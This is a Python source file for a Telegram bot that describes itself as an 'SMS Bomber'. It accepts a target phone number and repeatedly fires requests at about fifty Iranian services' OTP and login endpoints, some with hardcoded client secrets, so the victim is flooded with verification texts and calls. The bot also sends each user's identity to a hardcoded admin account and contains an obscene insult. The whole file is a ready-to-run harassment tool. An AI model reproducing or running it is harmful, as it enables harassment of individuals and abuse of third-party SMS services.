import telebot
from dotenv import load_dotenv
import os
import sys
sys.stdout.reconfigure(encoding='utf-8')
import requests
load_dotenv()
token = os.getenv("API_TOKEN")
bot = telebot.TeleBot(token)
from time import sleep,time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# members= {"USERid":status}
members = {}
limit_time_data ={}
id_ch="@sayeber"



# SMS BOMBER SCRIPT

class Bomber:
    def __init__(self,targetnum,nametarget,url,headers,payload,typepyload,method):
        self.nametarget = nametarget
        self.targetnum = targetnum
        self.url = url
        self.headers = headers
        self.payload = payload
        self.method = method
        self.typepyload=typepyload

    def response(self):
        if self.method == "GET":
            if self.typepyload == "params":
                try : response = requests.get(self.url, params=self.payload, headers=self.headers,timeout=5) 
                except Exception :
                    response = 400
                    pass
            elif self.typepyload == "json":
                try : response = requests.get(self.url,headers=self.headers,json=self.payload,timeout=5)
                except Exception :
                    response = 400
                    pass
            else:
                try : response = requests.get(self.url, headers=self.headers,allow_redirects=True,timeout=5)
                except Exception :
                    response = 400
                    pass
        elif self.method == "POST":
            if self.typepyload == "data":
                try : response=  requests.post(self.url,headers=self.headers,data=self.payload,allow_redirects=True,timeout=5)
                except Exception :
                    response = 400
                    pass
            elif self.typepyload == "json":
                try : response = requests.post(self.url, headers=self.headers, json= self.payload,allow_redirects=True,timeout=5)
                except Exception :
                    response = 400
                    pass
            elif self.typepyload =="params":
                try : response = requests.post(self.url,headers=self.headers,params=self.payload,allow_redirects=True,timeout=5)
                except Exception :
                    response = 400 
                    pass
            elif self.typepyload == "files":
                try: response = requests.post('https://www.iranconcert.com/user/check', headers=self.headers, files=self.payload,timeout=5)
                except Exception :
                    response = 400
                    pass
        match response.status_code:
            case 200 | 201 :
                return (f"{self.nametarget}  - successfully ✅")
            case _:
                return (f"{self.nametarget}  - unsuccessfully ❌")

def script(targetnum,round,msg):
    Listofobj = [
        (Bomber(targetnum=targetnum,nametarget="Gap.im",url=f"https://core.gap.im/v1/user/add.json?mobile={targetnum}",headers={"user-agent": "GapAndroid/9.6.5 (Build 9650; Android 11; Samsung)","aaccept": "application/json, text/plain, */*"},payload={""},typepyload=None,method="GET")),
        (Bomber(targetnum=targetnum,nametarget="SNAP FOOD",url="https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass",headers={"Content-Type": "application/x-www-form-urlencoded","Accept": "application/json","User-Agent": "Mozilla/5.0","Referer": "https://snappfood.ir/login/phone/"},payload={"cellphone":targetnum},typepyload="data",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="TAPSI",url="https://tap33.me/api/v2/user",headers={"User-Agent":"GapAndroid/9.6.5 (Build 9650; Android 11; Samsung)","aaccept":"application/json, text/plain, */*","Host":"tap33.me","content-type":"application/json","Referer":"https://app.tapsi.cab/"},payload={"credential":{"phoneNumber":targetnum,"role":"PASSENGER"}},typepyload="json",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="TOROB SMS",url=f"https://api.torob.com/v4/user/phone/send-pin/?phone_number={targetnum}&_http_referrer=https%3A%2F%2Fwww.google.com%2F&source=next_desktop&_landing_page=home",headers={"Content-Type":"application/x-www-form-urlencoded","Accept":"application/json","User-Agent":"Mozilla/5.0"},payload={""},typepyload=None,method="GET")),
        (Bomber(targetnum=targetnum,nametarget="SHYPOOR",url="https://www.sheypoor.com/api/v10.0.0/auth/send",headers={"Content-Type":"application/x-www-form-urlencoded","Accept":"application/json","User-Agent":"Mozilla/5.0","referer":"https://www.sheypoor.com/session"},payload={"username":targetnum},typepyload="json",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="OFOGKOROSH",url="https://okcs.com/users/mobilelogin",headers={"Accept":"*/*","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","User-Agent":"Mozilla/5.0","referer":"https://okcs.com/","X-Requested-With":"XMLHttpRequest"},payload={"mobile":targetnum,"url":"https://okcs.com/"},typepyload="data",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="OKALA",url="https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister",headers={"content-type":"application/json","user-agent":"Mozilla/5.0","accept":"application/json"},payload={"mobile":targetnum},typepyload="json",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="TOROB CALL",url=f"https://api.torob.com/v4/user/phone/send-voice-otp/?phone_number={targetnum}&_http_referrer=https%3A%2F%2Fwww.google.com%2F&source=next_desktop&_landing_page=home",headers = {'accept': '*/*','origin': 'https://torob.com','referer': 'https://torob.com/','sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0',},payload={'phone_number': targetnum,'_http_referrer': 'https://www.google.com/','source': 'next_desktop','_landing_page': 'home',},typepyload="params",method="GET")),
        (Bomber(targetnum=targetnum,nametarget="ALIBABA SMS",url="https://ws.alibaba.ir/api/v3/account/mobile/otp",headers = {"ab-alohomora": "k6ukbPR2RD8EmERrPP6gFb","ab-channel": "WEB-NEW,PRODUCTION,CSR,www.alibaba.ir,desktop,Chrome,144.0.0.0,N,N,Windows,10,3.245.3","accept": "application/json, text/plain, */*","content-type": "application/json","referer": "https://www.alibaba.ir/","sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"', "tracing-device": "N,Chrome,144.0.0.0,N,N,Windows","user-agent": "Mozilla/5.0 ",},payload={"phoneNumber":targetnum},typepyload="json",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="SNAPP MARKET",url=f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={targetnum}",headers={"Accept":"application/json","User-Agent":"Mozilla/5.0","referer":"https://hyper.snapp.market/"},payload={"cellphone":targetnum},typepyload="params",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="GAPFILM",url=f"https://core.gapfilm.ir/api/v3.2/Account/Login",headers= {"user-agent":"Mozilla/5.0","referer":"https://www.gapfilm.ir/","content-type":"application/json"},payload={"PhoneNo":targetnum},typepyload="json",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="SNAPP TRIP",url="https://platform-api.snapptrip.com/profile/auth/request-otp",headers={"user-agent":"Mozilla/5.0","referer":"https://www.snapptrip.com/","content-type":"application/json"},payload={"phoneNumber":targetnum},typepyload="json",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="FILMNET",url=f"https://filmnet.ir/api-v2/access-token/users/{targetnum}%20/otp",headers={"user-agent":"Mozilla/5.0","referer":"https://filmnet.ir/login","accept":"application/json"},payload={""},typepyload=None,method="GET")),
        (Bomber(targetnum=targetnum,nametarget="ANAR",url="https://anar-store.ir/api/v1/sessions/login_request",headers={"content-type":"application/json","origin":"https://anar-store.ir","referer":"https://anar-store.ir/","user-agent":"Mozilla/5.0 "},payload={"mobile_phone":targetnum},typepyload="json",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="AZKI",url="https://www.azki.com/api/core/v2/app/auth/check-login-availability",headers={"accept":"application/json, text/plain, */*","accept-language":"en-US,en;q=0.9","baggage":"sentry-environment=azki-default,sentry-release=5.108.0,sentry-public_key=a5b7afb5e6794f3b9da7de72b6d9dfdc,sentry-trace_id=9b1c2351bbfb44e9a4cd8fc44fadf342,sentry-transaction=%2F,sentry-sampled=false,sentry-sample_rand=0.11178535126292499,sentry-sample_rate=0.06","content-type":"application/json","device":"web","deviceid":"6","origin":"https://www.azki.com","priority":"u=1, i","referer":"https://www.azki.com/","sec-ch-ua":'"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',"sec-ch-ua-mobile":"?0","sec-ch-ua-platform":'"Windows"',"sec-fetch-dest":"empty","sec-fetch-mode":"cors","sec-fetch-site":"same-origin","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"},payload={"phoneNumber":targetnum},typepyload="json",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="DRDR",url="https://drdr.ir/api/v3/auth/login/mobile/init/",headers={"accept":"application/json, text/plain, */*","client-id":"f60d5037-b7ac-404a-9e3a-a263fd9f8054","content-type":"application/json","origin":"https://drdr.ir","referer":"https://drdr.ir/","user-agent":"Mozilla/5.0 "},payload={"mobile":targetnum},typepyload="json",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="NOBAT",url="https://api.nobat.ir/patient/login/phone",headers={"accept":"*/*","content-type":"application/json","origin":"https://user.nobat.ir","referer":"https://user.nobat.ir/","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"},payload={"mobile":targetnum},typepyload="json",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="LENDO",url="https://api.lendo.ir/api/customer/auth/send-otp",headers={"accept":"application/json, text/plain, */*","content-type":"application/json","origin":"https://lendo.ir","referer":"https://lendo.ir/","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36","x-timestamp":"1771621047840"},payload={"mobile":targetnum},typepyload="json",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="DIDNEGAR",url="https://www.didnegar.com/wp-admin/admin-ajax.php",headers={"accept":"*/*","content-type":"application/x-www-form-urlencoded; charset=UTF-8","origin":"https://www.didnegar.com","referer":"https://www.didnegar.com/my-account/","sec-ch-ua":'"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36","x-requested-with":"XMLHttpRequest"},payload={"action":"PLWN_ajax_send_sms","nonce":"e70b6b8410","mobile_number":targetnum},typepyload="data",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="KILID",url="https://kilid.com/api/uaa/portal/auth/v1/otp",headers={'accept': 'application/json, text/plain, */*','content-type': 'text/plain','origin': 'https://kilid.com','referer': 'https://kilid.com/profile/auth/login','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',},payload=targetnum,typepyload="data",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="BASALAM",url="https://services.basalam.com/web/v1/auth/captcha/otp-request",headers={"accept":"application/json, text/plain, */*","content-type":"application/json","origin":"https://basalam.com","referer":"https://basalam.com/","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"},payload={"mobile":targetnum,"client_id":"11","login_by_backup_mobile":False},typepyload="json",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="GHABZINO",url="https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode",headers = {'accept': 'application/json, text/plain, */*','content-type': 'application/json','origin': 'https://ghabzino.com','priority': 'u=1, i','referer': 'https://ghabzino.com/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'},payload={'Parameters': {'MobileNumber': targetnum,'ApplicationType': 'Web','ApplicationUniqueToken': 'web','ApplicationVersion': '1.0.0',},},typepyload="json",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="SIB IRANI",url="https://sandbox.sibirani.com/api/v1/developer/generator-inv-token",headers={"accept":"application/json","content-type":"application/json","origin":"https://developer.sibirani.com","priority":"u=1, i","referer":"https://developer.sibirani.com/","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"},payload={"username":targetnum},typepyload="json",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="SNAPP",url="https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&_gl=1*swgmno*_gcl_au*NzkwMTQyNDM1LjE3Njc1NjY3MTc.",headers={"accept":"application/json","accept-language":"en-US,en;q=0.9","baggage":"sentry-environment=production,sentry-release=v5.8.0,sentry-public_key=f9fe58cd9012452e90a48b00912d1f29,sentry-trace_id=10898208cdeb4a37b300d41cd4359316,sentry-sample_rate=1,sentry-sampled=true","content-type":"application/json","origin":"https://digitalsignup.snapp.ir","referer":"https://digitalsignup.snapp.ir/?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&_gl=1*swgmno*_gcl_au*NzkwMTQyNDM1LjE3Njc1NjY3MTc.","sentry-trace":"10898208cdeb4a37b300d41cd4359316-9254e58cb494c22e-1","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"},payload={"captcha_type":"none","cellphone":targetnum,"captcha_solution":"","captcha_ref_id":"","captcha_client_id":"71C84A80-395B-448E-A240-B7DC939186D3","attestation_method":"numeric","attestation_platform":"captcha"},typepyload="json",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="PINDO",url="https://api.pindo.ir/v1/user/login-register/",headers={"accept":"application/json, text/plain, */*","content-type":"application/json","origin":"https://www.pindo.ir","priority":"u=1, i","referer":"https://www.pindo.ir/","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36","x-requested-with":"XMLHttpRequest"},payload={"phone":targetnum},typepyload="json",method="POST")),
        (Bomber(targetnum="+98" + targetnum[1:],nametarget="DIVAR",url="https://api.divar.ir/v8/authenticate/signinup/code",headers={"accept":"application/json, text/plain, */*","content-type":"application/json","origin":"https://divar.ir","referer":"https://divar.ir/","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"},payload={"phoneNumber":"+98" + targetnum[1:]},typepyload="json",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="DIGIFY",url="https://backend.digify.shop/user/merchant/otp/",headers={"accept":"application/json, text/plain, */*","content-type":"application/json","origin":"https://digify.shop","priority":"u=1, i","referer":"https://digify.shop/","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"},payload={"phone_number":targetnum},typepyload="json",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="TLYN",url="https://my.tlyn.ir/api/v1/auth/send-otp",headers={"accept":"*/*","accept-language":"en-US,en;q=0.9","content-type":"application/json","origin":"https://my.tlyn.ir","priority":"u=1, i","referer":"https://my.tlyn.ir/login?utm_source=google","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36","x-requested-with":"XMLHttpRequest"},payload={"phone_number":targetnum},typepyload="json",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="MELIGOLD",url="https://melligold.com/api/v1/authentication/login-register/",headers={"accept":"application/json, text/plain, */*","accept-language":"en-US,en;q=0.9","content-type":"application/json","origin":"https://melligold.com","priority":"u=1, i","referer":"https://melligold.com/","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"},payload={"mobile":targetnum},typepyload="json",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="TALASEA",url="https://api.talasea.app/api/auth/sentOTP",headers={"accept":"application/json, text/plain, */*","content-type":"application/json","origin":"https://talasea.app","platform":"webClient","priority":"u=1, i","referer":"https://talasea.app/","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"},payload={"phoneNumber":targetnum},typepyload="json",method="POST")),
        (Bomber(targetnum="+98" + targetnum[1:],nametarget="MILLI GOLD",url="https://milli.gold/api/v1/public/otp",headers={"accept":"application/json, text/plain, */*","content-type":"application/json","origin":"https://milli.gold","priority":"u=1, i","referer":"https://milli.gold/app/sign-up?stepper=create-account","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36","x-channel":"MILLI","x-client-version":"1.0.0","x-platform":"PWA","x-release-version":"ebc23afa"},payload={"mobileNumber":"+98" + targetnum[1:],"operation":"REGISTER_USER"},typepyload="json",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="MAJIDGOLD",url="https://api.majidgold.ir/api/verify",headers={"Accept":"application/json;charset=UTF-8","Content-Type":"application/json","Origin":"https://majidgold.ir","Referer":"https://majidgold.ir/","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"},payload={"mobile":targetnum[1:]},typepyload="json",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="ALIBABA CALL",url="https://ws.alibaba.ir/api/v3/account/call/otp",headers={"ab-alohomora":"k6ukbPR2RD8EmERrPP6gFb","ab-channel":"WEB-NEW,PRODUCTION,CSR,www.alibaba.ir,desktop,Chrome,144.0.0.0,N,N,Windows,10,3.245.3","accept":"application/json, text/plain, */*","content-type":"application/json","referer":"https://www.alibaba.ir/","sec-ch-ua":'"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',"tracing-device":"N,Chrome,144.0.0.0,N,N,Windows","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"},payload={"phoneNumber":targetnum},typepyload="json",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="WALLGOLD",url="https://api.wallgold.ir/api/v1/auth/otp/send",headers={"accept":"application/json, text/plain, */*","content-type":"application/json","origin":"https://wallgold.ir","referer":"https://wallgold.ir/","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"},payload={"mobileNumber":targetnum,"action":"signup","platform":"web"},typepyload="json",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="JABAMA",url="https://gw.jabama.com/api/v4/account/send-code",headers={"Accept":"*/*","Content-Type":"application/json","Origin":"https://www.jabama.com","Referer":"https://www.jabama.com/","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"},payload={"mobile":targetnum},typepyload="json",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="SHAB",url="https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp",headers={"accept":"application/json, text/plain, */*","content-type":"application/json; charset=UTF-8","origin":"https://www.shab.ir","referer":"https://www.shab.ir/","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"},payload={"mobile":targetnum,"country_code":"+98"},typepyload="json",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="HONARTICKET",url="https://user.zirbana.com/v2/register",headers={"accept":"*/*","content-type":"application/x-www-form-urlencoded; charset=UTF-8","origin":"https://www.honarticket.com","referer":"https://www.honarticket.com/","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"},payload={"mobile":targetnum,"client_id":"19","client_secret":"jEdE7yt8EjNcyzYkNPyaAACMjVfYkmIi3vvifpiG"},typepyload="data",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="IRANCONCERT",url="https://www.iranconcert.com/user/check",headers={"accept":"*/*","content-type":"multipart/form-data; boundary=----WebKitFormBoundarySZIAQVGL6dOAixXo","origin":"https://www.iranconcert.com","referer":"https://www.iranconcert.com/user/login/","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36","x-requested-with":"XMLHttpRequest"},payload={'mobile': (None, targetnum),},typepyload="files",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="TIWALL",url="https://user.zirbana.com/v2/register",headers={"accept":"*/*","accept-language":"en-US,en;q=0.9","content-type":"application/x-www-form-urlencoded; charset=UTF-8","origin":"https://www.tiwall.com","priority":"u=1, i","referer":"https://www.tiwall.com/","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"},payload={"mobile":targetnum,"client_id":"15","client_secret":"yKrlLyr4IBxXhZSyvjKZLObsUF8iSGNhtEEcjfIr"},typepyload="data",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="NOGHRESEA",url="https://api.noghresea.ir/api/auth/sentOTP",headers={"accept":"application/json, text/plain, */*","content-type":"application/json","origin":"https://noghresea.ir","referer":"https://noghresea.ir/","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"},payload={"phoneNumber":targetnum},typepyload="json",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="ZARNIV",url="https://trade.zarniv.ir/component/mygoldtrade/task/Ajaxloader.StartPasswordSend/T/0.7414991488338188",headers={"accept":"*/*","content-type":"application/x-www-form-urlencoded; charset=UTF-8","origin":"https://trade.zarniv.ir","referer":"https://trade.zarniv.ir/login","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36","x-requested-with":"XMLHttpRequest"},payload={"username":targetnum,"ehrazhoviat":"52304","isApple":"0","c58538c082d38f59692b2597c647eeb0":"1"},typepyload="data",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="SARAF",url="https://api.saraf.app/v2/account/login",headers={"accept":"*/*","content-type":"application/json;charset=UTF-8","origin":"https://trader.saraf.app","priority":"u=1, i","referer":"https://trader.saraf.app/","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36","x-device-type":"web"},payload={'phone': targetnum,'inviteKey': None,},typepyload="json",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="ARIAMEDIC",url="https://ariamedic.com/auth/login/send-code",headers={"Accept":"application/json","Connection":"keep-alive","Content-Type":"application/json","Origin":"https://ariamedic.com","Referer":"https://ariamedic.com/auth/login","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"},payload={"phone":targetnum},typepyload="json",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="snapp.doctor",url="https://api.snapp.doctor/userauth/otp",headers={'accept': 'application/json','origin': 'https://snapp.doctor','referer': 'https://snapp.doctor/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',},payload={'mobile': targetnum},typepyload="params",method="GET")),
        (Bomber(targetnum=targetnum,nametarget="BEHESHTICARPET",url="https://shop.beheshticarpet.com/wp-admin/admin-ajax.php",headers={"accept":"application/json, text/javascript, */*; q=0.01","content-type":"application/x-www-form-urlencoded; charset=UTF-8","origin":"https://shop.beheshticarpet.com","priority":"u=1, i","referer":"https://shop.beheshticarpet.com/auth/","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36","x-requested-with":"XMLHttpRequest"},payload={"action":"voorodak__submit-username","username":targetnum,"security":"a8b3e5f00f"},typepyload="data",method="POST")),
        (Bomber(targetnum=targetnum,nametarget="SNAPP.taxi",url="https://app.snapp.taxi/api/api-passenger-oauth/v3/mutotp",headers = {'accept': '*/*','accept-language': 'en-US,en;q=0.9','app-version': 'pwa','content-type': 'application/json','locale': 'fa-IR','origin': 'https://app.snapp.taxi','priority': 'u=1, i','referer': 'https://app.snapp.taxi/login','user-agent': 'Mozilla/5.0','x-app-name': 'passenger-pwa','x-app-version': 'v18.35.6',},payload={'cellphone': targetnum,'attestation': {'method': 'skip','platform': 'skip',},'extra_methods': [],},typepyload="json",method="POST")),
        (Bomber(targetnum=targetnum, nametarget="wallgold", url="https://api.wallgold.ir/api/v1/auth/otp/send", headers={"Content-Type": "application/json", "Accept": "application/json, text/plain, */*", "Origin": "https://wallgold.ir", "Referer": "https://wallgold.ir/", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"}, payload={"mobileNumber": targetnum, "action": "signup", "platform": "web"}, typepyload="json", method="POST")),
        (Bomber(targetnum=targetnum, nametarget="talasea", url="https://api.talasea.ir/api/auth/sentOTP", headers={"Content-Type": "application/json", "Accept": "application/json, text/plain, */*", "Origin": "https://talasea.ir", "Referer": "https://talasea.ir/", "Platform": "webClient", "Old-Auth": "false", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"}, payload={"phoneNumber": targetnum}, typepyload="json", method="POST")),
        (Bomber(targetnum=targetnum, nametarget="numberland", url="https://auth.numberland.ir/send-otp", headers={"Content-Type": "application/json", "Accept": "application/json", "Origin": "https://numberland.ir", "Referer": "https://numberland.ir/", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"}, payload={"phone": targetnum}, typepyload="json", method="POST")),
        ]
    n = round
    for times in range(n):
        for cls in Listofobj:
            if members[msg.from_user.id]:
                try:
                    res_text = cls.response()
                    bot.send_message(msg.chat.id,text=res_text)
                except : pass
            else: break
        if times < round :
            if members[msg.from_user.id]:
                bot.send_message(msg.chat.id,f"⏳ Round {times} end, next round will start soon.")
                sleep(2)
            else:break
    bot.send_message(msg.chat.id,"""✅ Process completed successfully!
Hope you enjoyed it!
To start a new process, send /start.""")




################# BOT 

def limit_time(msg):
    if msg.from_user.id in limit_time_data:
        if ( int(time()) - limit_time_data[msg.from_user.id] > 28800 ):
            return True
        else:
            x= 28800 - (int(time()) - limit_time_data[msg.from_user.id])
            bot.send_message(msg.chat.id,f"⏳ Please wait {x//3600}h and {(x % 3600) // 60 }m before trying again. ") 
            return False
    else:
        return True

# Join channel
def is_user_member(user_id: int) -> bool:
    try:
        status = bot.get_chat_member(id_ch, user_id).status
        return status in ['creator', 'administrator', 'member']
    except Exception:
        return False

@bot.callback_query_handler(func=lambda call:call.data == "verify_join")
def verify_callback(call):
    if is_user_member(call.from_user.id):
        bot.answer_callback_query(call.id, "✅ عضویت تایید شد!")
        bot.edit_message_text("تایید شد! حالا می‌توانید از خدمات ربات استفاده کنید.", call.message.chat.id, call.message.message_id)
    else:
        bot.answer_callback_query(call.id, "❌ هنوز عضو کانال نشده‌اید!", show_alert=True)


#Bot
@bot.message_handler(commands=['start'],func=limit_time)
def welcome(msg):
    user_id = msg.from_user.id
    if is_user_member(user_id):
        # print(msg.from_user.id)
        if msg.from_user.id in members:
            if members[msg.from_user.id] != True:
                print(members)
                bot.send_message(msg.chat.id,f"""Welcome! {msg.from_user.first_name}👋 \n\n
Welcome to the SMS Bomber Bot. To get started, please send your target phone number.\n
⚠️ **Required format:** `09xxxxxxxxx` (e.g., `09123456789`)
            """,parse_mode="MarkDown")
                bot.register_next_step_handler(msg,targetphone)
            else:
                bot.send_message(msg.chat.id,"You already have a process running. Please wait for it to finish or cancel it before starting a new one.")
        else:
            bot.send_message(msg.chat.id,f"""Welcome! {msg.from_user.first_name}👋 \n\n
Welcome to the SMS Bomber Bot. To get started, please send your target phone number.\n
⚠️ **Required format:** `09xxxxxxxxx` (e.g., `09123456789`)
                    """,parse_mode="MarkDown")
            bot.register_next_step_handler(msg,targetphone)
    else:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("📢 عضویت در کانال", url=f"https://t.me/{id_ch.replace('@', '')}"))
        markup.add(InlineKeyboardButton("✅ بررسی عضویت", callback_data="verify_join"))

        bot.send_message(
            msg.chat.id,
            "⚠️ جهت استفاده از ربات ابتدا در کانال زیر عضو شوید:",
            reply_markup=markup
        )

def targetphone(msg,*args,**kwargs):
    user = msg.from_user
    full_name = user.first_name + (f" {user.last_name}" if user.last_name else "")
    username = f"@{user.username}" if user.username else "ندارد"
    text = (
        "📩 پیام جدید به ربات\n\n"
        f"👤 نام: {full_name}\n"
        f"🔗 یوزرنیم: {username}\n"
        f"🆔 آیدی عددی: {user.id}\n\n"
        f"💬 متن پیام: {msg.text or '(غیرمتنی)'}"
    )
    bot.send_message(7535325081, text)    
    global status
    bot.send_message(msg.chat.id,msg.text)
    if len(str(msg.text)) == 11 and str(msg.text).startswith("0"):
        members[msg.from_user.id] = True
        limit_time_data[msg.from_user.id] = int(time())
        bot.send_message(msg.chat.id,"Phone number received. Process is starting..")
        num = str(msg.text)
        if num == "09051461773" or num == "09918864278":
            bot.send_message(msg.chat.id,"""بیا کیرمو بخور""")
            return
        script(num,5,msg)
    elif len(str(msg.text)) == 10 and str(msg.text).startswith("9"):
        num = "0" + msg.text
        bot.send_message(msg.chat.id,"Phone number received. Process is starting..")
        limit_time_data[msg.from_user.id] = int(time())
